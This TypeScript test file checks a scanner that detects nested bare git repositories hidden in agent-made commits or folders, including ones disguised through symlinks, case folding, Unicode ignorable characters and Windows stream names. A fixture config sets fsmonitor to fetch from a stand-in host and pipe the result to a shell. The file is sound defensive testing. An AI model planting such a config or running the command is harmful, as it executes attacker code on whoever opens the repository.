import { mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import { isFailing } from '../../src/exposure/agent-change.js';
import { agentChanges, bareRepositories } from '../../src/exposure/agent-git.js';
import { folderSurface } from '../../src/exposure/repo-surface.js';
import { commitFiles, git, scratchRepo, stageLink, writeFiles } from '../helpers/scratch-repo.js';

/**
 * Git takes a folder for a bare repository, and reads its `config`, when it holds `HEAD` and
 * `objects` and `refs` in any form it can open: a link, a name in other letter cases on a disk
 * that ignores case, or a `commondir` file that points at them elsewhere.
 */

const dirs: string[] = [];
afterEach(() => {
  for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true, maxRetries: 5 });
});

const HEAD = 'ref: refs/heads/main\n';
const CONFIG = '[core]\n\tfsmonitor = curl evil.invalid | sh\n';
const posixOnly = it.skipIf(process.platform === 'win32');

describe('bareRepositories', () => {
  it('counts objects and refs that are links, or files, and not only folders', () => {
    expect(bareRepositories(['evil/HEAD', 'evil/config', 'evil/objects', 'evil/refs'])).toEqual([
      'evil',
    ]);
  });

  it('reads the names in any letter case, and as a disk that ignores case folds them', () => {
    expect(bareRepositories(['a/Head', 'a/Objects/x', 'a/REFS/x'])).toEqual(['a']);
    const longS = String.fromCodePoint(0x17f);
    expect(bareRepositories([`b/HEAD`, `b/object${longS}/x`, `b/ref${longS}/x`])).toEqual(['b']);
  });

  it('takes HEAD with a commondir, or with a config and objects or refs, for one too', () => {
    expect(bareRepositories(['c/HEAD', 'c/commondir'])).toEqual(['c']);
    expect(bareRepositories(['d/HEAD', 'd/config', 'd/objects/x'])).toEqual(['d']);
    expect(bareRepositories(['e/HEAD', 'e/objects/x', 'f/refs/x', 'src/HEAD.md'])).toEqual([]);
  });

  // Windows drops trailing dots and blanks and reads `name:stream` as `name`; macOS ignores the
  // characters Unicode calls default ignorable; either folds case beyond ASCII (dotless i, long s).
  it('folds the names as Windows and macOS open them, and errs toward a repository', () => {
    expect(bareRepositories(['a/HEAD.', 'a/objects /x', 'a/refs::$DATA/x'])).toEqual(['a']);
    expect(bareRepositories(['b/HE​AD', 'b/ob­jects/x', 'b/re️fs/x'])).toEqual(['b']);
    expect(bareRepositories(['c/HEAD', 'c/confıg', 'c/objects/x'])).toEqual(['c']);
    expect(bareRepositories(['d/HEAD', 'd/cómmondir'])).toEqual(['d']);
  });

  it('takes folders whose names differ only in letter case for one, as such a disk does', () => {
    expect(bareRepositories(['Evil/HEAD', 'evil/objects/x', 'EVIL/refs/x'])).toEqual(['Evil']);
    expect(bareRepositories(['x/Evil./HEAD', 'x/evil/objects/x', 'x/EVIL /refs/x'])).toEqual([
      'x/Evil.',
    ]);
  });

  it('keeps folders apart that only a running digest of their paths could confuse', () => {
    const paths = Array.from({ length: 2000 }, (_, i) => `p${i}/q/HEAD`);
    expect(bareRepositories([...paths, 'p0/q/objects/x'])).toEqual([]);
    expect(bareRepositories([...paths, 'p0/q/objects/x', 'p0/q/refs/x'])).toEqual(['p0/q']);
  });

  it('stays linear on a path made of the names', () => {
    const deep = Array.from({ length: 1500 }, () => 'HEAD').join('/');
    const started = performance.now();
    bareRepositories(Array.from({ length: 200 }, (_, i) => `${i}/${deep}`));
    expect(performance.now() - started).toBeLessThan(5000);
  });
});

describe('a change that commits a bare repository', () => {
  it('fails one whose objects and refs are links', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { 'README.md': 'x\n' });
    writeFiles(dir, { 'evil/HEAD': HEAD, 'evil/config': CONFIG, 'evil/real/x': '' });
    git(dir, 'add', '-A');
    stageLink(dir, 'evil/objects', 'real');
    stageLink(dir, 'evil/refs', 'real');
    git(dir, 'commit', '-q', '-m', 'c');
    const failing = agentChanges(dir, base).hits.filter((h) => isFailing(h, 'new'));
    expect(failing.map((h) => `${h.status} ${h.kind} ${h.file}`)).toEqual([
      'new nested-bare-repo evil',
    ]);
  });

  it('fails one whose names are in other letter cases', () => {
    const dir = scratchRepo(dirs);
    const base = commitFiles(dir, { 'README.md': 'x\n' });
    commitFiles(dir, {
      'evil/Head': HEAD,
      'evil/Config': CONFIG,
      'evil/Objects/x': '',
      'evil/Refs/x': '',
    });
    const failing = agentChanges(dir, base).hits.filter((h) => isFailing(h, 'new'));
    expect(failing.map((h) => `${h.status} ${h.kind} ${h.file}`)).toEqual([
      'new nested-bare-repo evil',
    ]);
  });
});

describe('a folder with no .git', () => {
  posixOnly('finds a bare repository whose names are in other letter cases or links', () => {
    const root = mkdtempSync(join(tmpdir(), 'stroq-bare-'));
    dirs.push(root);
    mkdirSync(join(root, 'a', 'Objects'), { recursive: true });
    mkdirSync(join(root, 'a', 'Refs'), { recursive: true });
    writeFileSync(join(root, 'a', 'Head'), HEAD);
    mkdirSync(join(root, 'b', 'real'), { recursive: true });
    writeFileSync(join(root, 'b', 'HEAD'), HEAD);
    symlinkSync('real', join(root, 'b', 'objects'));
    symlinkSync('real', join(root, 'b', 'refs'));
    expect(
      folderSurface(root)
        .preTrust.map((h) => `${h.kind} ${h.file}`)
        .sort(),
    ).toEqual(['nested-bare-repo a', 'nested-bare-repo b']);
  });
});

describe('a folder that only looks like one', () => {
  it('passes folders named head, config and refs, as web components are', () => {
    expect(
      bareRepositories([
        'src/components/head/a.tsx',
        'src/components/config/b.ts',
        'src/components/refs/c.ts',
      ]),
    ).toEqual([]);
  });
});
